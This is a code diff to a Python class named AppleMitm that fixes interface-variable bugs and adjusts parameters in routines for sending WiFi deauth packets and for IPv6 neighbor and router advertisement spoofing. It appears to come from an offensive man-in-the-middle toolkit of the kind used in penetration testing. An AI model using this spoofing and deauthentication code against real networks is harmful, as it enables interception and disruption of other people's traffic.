@@ -234,7 +234,7 @@ class AppleMitm:
                 'Network interface: ' + self._base.error_text(mitm_network_interface) + ' is not Wireless!'
 
             assert len(self._base.list_of_wireless_network_interfaces()) <= 1, \
-                'You have only one wireless interface: ' + self._base.info_text(mitm_interface) + \
+                'You have only one wireless interface: ' + self._base.info_text(mitm_network_interface) + \
                 '; to send WiFi deauth packets you need a second wireless interface!'
 
             assert self._your['essid'] is not None \
@@ -245,7 +245,7 @@ class AppleMitm:
             # region Set network interface for send wifi deauth packets
             deauth_network_interface = \
                 self._base.network_interface_selection(interface_name=deauth_interface,
-                                                       exclude_interface=mitm_interface,
+                                                       exclude_interface=mitm_network_interface,
                                                        only_wireless=True,
                                                        message='Please select a network interface for '
                                                                'send WiFi deauth packets from table: ')
@@ -320,7 +320,7 @@ class AppleMitm:
                 if self._mitm_techniques[self._mitm_technique] == 'Rogue SLAAC/DHCPv6 server':
                     self._gateway['ipv6-address'] = self._your['ipv6-link-address']
                 else:
-                    self._base.print_info('Search IPv6 Gateway and DNS server on interface: ', mitm_interface)
+                    self._base.print_info('Search IPv6 Gateway and DNS server on interface: ', mitm_network_interface)
                     self._icmpv6_router_search: ICMPv6RouterSearch = \
                         ICMPv6RouterSearch(network_interface=mitm_network_interface)
                     _router_advertisement_data = \
@@ -566,24 +566,27 @@ class AppleMitm:
 
     # region NA spoofing
     def _na_spoof(self):
-        sleep(3)
+        # sleep(3)
         ipv6_spoof: IPv6Spoof = IPv6Spoof(network_interface=self._your['network-interface'])
         ipv6_spoof.start(technique=2,
                          target_ipv6_address=self._target['ipv6-address'],
                          target_mac_address=self._target['mac-address'],
                          gateway_ipv6_address=self._gateway['ipv6-address'],
                          dns_ipv6_address=self._dns_server['ipv6-address'],
+                         ipv6_prefix=self._ipv6_network_prefix,
                          quiet=False)
     # endregion
 
     # region RA spoofing
     def _ra_spoof(self):
-        sleep(3)
+        # sleep(3)
         ipv6_spoof: IPv6Spoof = IPv6Spoof(network_interface=self._your['network-interface'])
         ipv6_spoof.start(technique=1,
                          target_ipv6_address=self._target['ipv6-address'],
                          target_mac_address=self._target['mac-address'],
                          gateway_ipv6_address=self._gateway['ipv6-address'],
+                         dns_ipv6_address=self._dns_server['ipv6-address'],
+                         ipv6_prefix=self._ipv6_network_prefix,
                          quiet=False)
     # endregion
 
